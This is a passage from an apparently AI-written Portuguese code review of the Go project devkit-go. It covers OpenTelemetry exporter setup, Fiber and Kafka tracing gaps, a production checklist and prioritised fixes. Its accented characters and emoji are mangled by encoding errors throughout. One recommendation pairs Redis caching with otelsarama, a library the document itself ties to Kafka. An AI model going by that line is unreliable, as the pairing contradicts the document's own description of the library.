func (p *Provider) createTraceExporter(ctx context.Context) (sdktrace.SpanExporter, error) {
    timeout := p.config.ExporterTimeout
    if timeout == 0 {
        timeout = 10 * time.Second
    }

    opts := []otlptracegrpc.Option{
        otlptracegrpc.WithEndpoint(p.config.OTLPEndpoint),
        otlptracegrpc.WithTimeout(timeout), // ‚Üê Configur√°vel
        otlptracegrpc.WithRetry(otlptracegrpc.RetryConfig{
            Enabled:         true,
            InitialInterval: 1 * time.Second,
            MaxInterval:     5 * time.Second,
            MaxElapsedTime:  30 * time.Second,
        }),
    }

    // ...
}
```

---

### üìä AN√ÅLISE DE COMPATIBILIDADE

#### Fiber Integration

**Status**: ‚ö†Ô∏è **INCOMPLETO**

**Missing**:
- ‚ùå Sem exemplo de integra√ß√£o com `otelfiber`
- ‚ùå Sem documenta√ß√£o de `c.UserContext()`
- ‚ùå Sem exemplo de error handling com tracing

**Fornecido no DBManager B**:
```go
import "go.opentelemetry.io/contrib/instrumentation/github.com/gofiber/fiber/otelfiber/v2"

app.Use(otelfiber.Middleware(
    otelfiber.WithServerName("my-api"),
))

app.Get("/users/:id", func(c *fiber.Ctx) error {
    ctx := c.UserContext() // ‚Üê ESSENCIAL
    user, err := repo.FindByID(ctx, id)
    return c.JSON(user)
})
```

---

#### Kafka Integration

**Status**: ‚ùì **N√ÉO VERIFICADO**

**Existente**: `pkg/messaging/kafka/`

**Verificar**:
- Context propagation funciona em Producer ‚Üí Consumer?
- Traces conectam corretamente?
- H√° instrumenta√ß√£o autom√°tica?

**Recomenda√ß√£o**:
Adicionar `go.opentelemetry.io/contrib/instrumentation/github.com/Shopify/sarama/otelsarama`

---

## üìã CHECKLIST PRODUCTION-READY

### Database

- [ ] **Instrumenta√ß√£o OpenTelemetry implementada** (otelsql ou pgxpool com tracer)
- [ ] **M√©tricas de pool monitoradas** (usage, wait_time, idle)
- [ ] **MaxOpenConns configurado baseado em load testing**
- [ ] **MaxOpenConns ‚â§ PostgreSQL max_connections**
- [ ] **ConnMaxLifetime ajustado para ambiente** (load balancer vs direct)
- [ ] **URI validation com SSL mode enforced em produ√ß√£o**
- [ ] **Graceful shutdown com timeout adequado** (‚â•10s)
- [ ] **Health checks implementados** (readiness/liveness)
- [ ] **Alertas configurados para pool saturation**
- [ ] **Sem connection leaks** (defer rows.Close() em todos os queries)

### Observability

- [ ] **Provider inicializado UMA VEZ no main()**
- [ ] **Shutdown em ordem reversa com timeouts individuais**
- [ ] **Prote√ß√£o contra duplicate provider** (singleton pattern)
- [ ] **Alta cardinalidade bloqueada em m√©tricas** (no user_id, request_id, etc.)
- [ ] **PII redaction habilitada em logs**
- [ ] **Trace context propagation testado** (HTTP ‚Üí Service ‚Üí DB)
- [ ] **Sample rate configurado apropriadamente** (produ√ß√£o: 0.1-0.3)
- [ ] **Exporter timeout configurado** (‚â§10s)
- [ ] **Graceful shutdown exporta telemetria antes de morrer**
- [ ] **Alertas para telemetry export failures**

### Fiber (se usado)

- [ ] **otelfiber middleware registrado ANTES das rotas**
- [ ] **Todos handlers usam c.UserContext()**, nunca context.Background()
- [ ] **Error handling propaga erros para spans**
- [ ] **Health checks separados de rotas traced**

### Kubernetes

- [ ] **Readiness probe usa database.Ping()**
- [ ] **Liveness probe n√£o depende de database**
- [ ] **terminationGracePeriodSeconds ‚â• 30**
- [ ] **preStop hook permite flush de telemetria**
- [ ] **Resources limits configurados** (evita OOM)

### Security

- [ ] **DSN em secrets, n√£o em c√≥digo**
- [ ] **sslmode=disable proibido em produ√ß√£o**
- [ ] **TLS 1.2+ enforced**
- [ ] **Senhas nunca logadas** (URI sanitizada)
- [ ] **PII n√£o aparece em traces/logs/m√©tricas**

---

## üéØ PRIORIZA√á√ÉO DE FIXES

### üî• CR√çTICO (Fix Imediatamente)

1. **Database sem observabilidade**
   - Impacto: Imposs√≠vel debugar em produ√ß√£o
   - Esfor√ßo: M√©dio (usar DBManager A que criei)
   - Risco: Alto (voando cego)

2. **Shutdown perdendo telemetria**
   - Impacto: Traces/m√©tricas incompletas
   - Esfor√ßo: Baixo (ordenar shutdowns)
   - Risco: M√©dio (perda de dados)

3. **Alta cardinalidade n√£o bloqueada**
   - Impacto: Custo $$$ explosivo
   - Esfor√ßo: M√©dio (validar attributes)
   - Risco: Alto (fatura de $50k+)

### ‚ö†Ô∏è ALTO (Fix em 1-2 Sprints)

4. **URI validation ausente**
   - Impacto: Seguran√ßa comprometida
   - Esfor√ßo: Baixo (adicionar validateURI)
   - Risco: M√©dio (leak de dados)

5. **Duplicate provider n√£o detectado**
   - Impacto: Memory leak + telemetria duplicada
   - Esfor√ßo: Baixo (singleton pattern)
   - Risco: M√©dio (custo + bugs sutis)

### üìå M√âDIO (Backlog)

6. **Fiber integration incompleta**
   - Impacto: Desenvolvedores usam errado
   - Esfor√ßo: Baixo (adicionar exemplos)
   - Risco: Baixo (tracing n√£o funciona)

7. **Exporter timeout n√£o configur√°vel**
   - Impacto: Export pode travar
   - Esfor√ßo: Baixo (adicionar timeout config)
   - Risco: Baixo (raro)

---

## üöÄ RECOMENDA√á√ïES ESTRAT√âGICAS

### Curto Prazo (Pr√≥ximos 30 Dias)

1. **Migrar para DBManagers fornecidos**:
   - Use `postgres_otelsql` (DBManager A) para projetos com database/sql
   - Use `pgxpool_manager` (DBManager B) para novos projetos com Fiber
   - Benef√≠cio: Observabilidade imediata

2. **Implementar prote√ß√£o de cardinalidade**:
   - Adicionar `sanitizeMetricAttributes()`
   - Bloquear keys de alta cardinalidade
   - Benef√≠cio: Previne custos explosivos

3. **Corrigir shutdown order**:
   - Reverter ordem de shutdown
   - Adicionar timeouts individuais
   - Benef√≠cio: Zero perda de telemetria

### M√©dio Prazo (2-3 Meses)

4. **Adicionar observabilidade em Kafka**:
   - Integrar `otelsarama`
   - Testar trace propagation Producer ‚Üí Consumer
   - Benef√≠cio: Visibilidade end-to-end

5. **Implementar circuit breaker em exporters**:
   - Proteger app de collector inst√°vel
   - Degradar gracefully se exporter falhar
   - Benef√≠cio: Resili√™ncia

6. **Criar dashboard de observabilidade**:
   - Grafana com m√©tricas de pool
   - Alertas para satura√ß√£o
   - Benef√≠cio: Proatividade

### Longo Prazo (6+ Meses)

7. **Migrar completamente para pgx**:
   - Substituir database/sql por pgx nativo
   - Benef√≠cio: Performance + context em Commit()

8. **Implementar distributed caching**:
   - Redis com otelsarama tracing
   - Benef√≠cio: Reduzir carga no DB

---

## üìö REFER√äNCIAS E RECURSOS

### DBManagers Criados

1. **postgres_otelsql** (DBManager A)
   - Localiza√ß√£o: `pkg/database/postgres_otelsql/`
   - Para: Projetos existentes com database/sql
   - Tracing: Autom√°tico via otelsql
   - README: `pkg/database/postgres_otelsql/README.md`

2. **pgxpool_manager** (DBManager B)
   - Localiza√ß√£o: `pkg/database/pgxpool_manager/`
   - Para: Novos projetos + Fiber
   - Tracing: Nativo via pgx.QueryTracer
   - Exemplo completo: `pkg/database/pgxpool_manager/examples/fiber_complete/main.go`
   - README: `pkg/database/pgxpool_manager/README.md`

### Bibliotecas Recomendadas

```bash
# Tracing
go get github.com/XSAM/otelsql
go get go.opentelemetry.io/contrib/instrumentation/github.com/gofiber/fiber/otelfiber/v2
go get go.opentelemetry.io/contrib/instrumentation/github.com/Shopify/sarama/otelsarama

# Database
go get github.com/jackc/pgx/v5
go get github.com/jackc/pgx/v5/pgxpool

# Observability
go get go.opentelemetry.io/otel
go get go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc
go get go.opentelemetry.io/otel/sdk
```

### Documenta√ß√£o Externa

- [OpenTelemetry Go Best Practices](https://opentelemetry.io/docs/languages/go/)
- [otelsql Documentation](https://github.com/XSAM/otelsql)
- [pgx Performance Guide](https://github.com/jackc/pgx/wiki/Performance)
- [Fiber Tracing Guide](https://docs.gofiber.io/api/middleware/otelfiber)
- [High Cardinality in Metrics](https://www.robustperception.io/cardinality-is-key)

---

## ‚úÖ CONCLUS√ÉO

### Resumo

O projeto **devkit-go** tem uma base arquitetural **s√≥lida** com Clean Architecture bem implementada, especialmente em `pkg/observability`. No entanto, h√° **gaps cr√≠ticos** em `pkg/database` que tornam o sistema **n√£o observ√°vel em produ√ß√£o**.

### Nota Geral: **7.5/10**

**Breakdown**:
- Arquitetura: 9/10 (excelente separa√ß√£o de concerns)
- Documenta√ß√£o: 9/10 (coment√°rios detalhados e justificados)
- Observability: 4/10 (**database sem tracing, shutdown perde dados**)
- Seguran√ßa: 6/10 (valida√ß√µes ausentes, mas estrutura permite adicionar)
- Production-Ready: 5/10 (**n√£o est√° pronto sem os fixes cr√≠ticos**)

### A√ß√£o Imediata

**N√£o fa√ßa deploy em produ√ß√£o sem**:
1. Instrumentar database com OpenTelemetry (use DBManagers fornecidos)
2. Corrigir shutdown order (prevenir perda de telemetria)
3. Bloquear alta cardinalidade em m√©tricas (prevenir custo explosivo)

### Pr√≥ximos Passos

1. Revisar este documento com o time
2. Priorizar fixes cr√≠ticos (1-3)
3. Testar DBManagers fornecidos em staging
4. Implementar alertas de observabilidade
5. Criar runbook para troubleshooting

---

**Fim da An√°lise** üéØ
